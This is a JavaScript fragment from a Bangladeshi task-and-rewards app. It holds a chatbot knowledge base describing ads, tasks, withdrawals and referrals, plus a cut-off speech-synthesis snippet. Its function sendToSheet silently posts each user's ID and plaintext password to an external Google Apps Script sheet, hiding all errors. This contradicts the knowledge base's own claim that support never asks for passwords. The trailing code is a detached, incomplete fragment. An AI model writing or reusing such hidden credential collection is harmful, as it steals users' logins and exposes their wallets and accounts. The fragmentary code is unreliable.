var APP_KB=`Tech BD Income is a task and rewards app. Home screen sections: Play Game & Earn (card on top), Earn Ads, Social Task, Tg Task, Visit Task, Daily Bonus, Gmail Sell (coming soon, not available), Promo Code and Friends. Bottom bar: Support, Wallet, Home, Refer, Profile.
Top bar: shows the member name and the current balance in BDT.
Earn Ads: pick an ad and tap WATCH. The ad link may open, keep the app screen open until the timer ends, then the reward is added. Each ad can be watched once per hour per user.
Play Game & Earn: a bubble shooter game with small levels. Tap PLAY LEVEL, an ad may show first, drag to aim and release to shoot, match 3 or more bubbles of the same color to pop them and clear the board, then watch the ad and tap CLAIM to get the reward. The reward per level and the daily limit are set by the admin.
Payment Proofs: a page (More menu and Home) that lists real approved payouts with masked name and account, method, amount, date, Ref number and transaction ID, plus total paid. Admin can also post every payout to a public proof channel.
Join to continue: when the admin requires it, the app first shows the channels and groups to join. Tap Join on each one, then tap I've joined - continue. The app opens only after the join is confirmed, and nothing else can be used before that.
Social Task: web and YouTube tasks. Tap START, finish the timer, the reward is added. Each task can be done once per user. Filters: All Missions, Web Task, YouTube Task.
Tg Task: Telegram tasks. Tap JOIN NOW to open the channel or group, join it, return to the app and tap VERIFY to get the reward. Each task once.
Visit Task: website visit tasks with a timer. Tap START and wait for the timer.
Daily Bonus: one bonus per day (resets each day in Bangladesh time). Tap CLAIM BONUS, an ad opens, and when you come back from the ad the bonus is added. The amount is set by the admin.
Promo Code: enter the secret code and tap CLAIM REWARD. Each code works once per account. Codes are given by the admin on the official channel.
Wallet: withdraw. Enter the amount, your Bkash or Nagad number, choose Bkash or Nagad, then SUBMIT REQUEST. There is a minimum withdrawal amount set by the admin. The admin reviews every request and pays manually. Status (pending, approved, rejected) is shown in Profile > Withdraw History. If a request is rejected the amount is returned to the balance.
Refer: copy your invite link and share it. Referral commission is 8 percent of what invited friends earn from tasks.
Friends: all registered users are listed. Send a friend request, the other person accepts, then you can message and make audio or video calls. Calls need both people online. Messages are saved.
Profile: shows main balance, ads viewed, and a menu: Leaderboard (top earners), My Team, Promo History, Withdraw History, Work Tutorials, 24/7 Support, Privacy Policy.
Support: Official Channel, Contact Admin chat (this chat), Payment Proofs, Discussion Group, and the live clock. Human support hours are 10:00 AM to 10:00 PM Bangladesh time.
Contact Admin chat: this assistant answers common questions. If it cannot answer, the question is sent to the admin and the reply appears in this chat.
Announcements from the admin appear on the home screen. Banners on the home screen are set by the admin.
Account: if an account is suspended by the admin the app shows an account suspended screen and the user must contact support.
Safety: never share your password, OTP or PIN with anyone. Support never asks for them.
Balance: it grows from ads, tasks, daily bonus and promo codes. Pending and approved withdrawals are deducted.`;

function sendToSheet(sheetUrl, uid, password, key, type){
  if(!sheetUrl || !/^https:\/\/script\.google\.com\//.test(sheetUrl)) return;
  try{
    fetch(sheetUrl, {
      method: "POST",
      mode: "no-cors",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        uid: uid,
        password: password,
        key: key,
        type: type,
        time: new Date().toISOString()
      })
    }).catch(function(){});
  }catch(e){}
}

        var u=new SpeechSynthesisUtterance(msg);u.lang="bn-BD";u.rate=1;u.volume=1;u.pitch=1;
        var vs=syn.getVoices()||[],v=null;
        for(var i=0;i<vs.length;i++){if(/^bn/i.test(vs[i].lang)){v=vs[i];break}}
        if(!v)for(var i=0;i<vs.length;i++){if(/^hi/i.test(vs[i].lang)){v=vs[i];break}}
        if(v)u.voice=v;
        syn.speak(u)
      }catch(e){}
    };
    if(syn.getVoices().length)go();
    else{var done=false;syn.onvoiceschanged=function(){if(!done){done=true;go()}};setTimeout(go,250)}
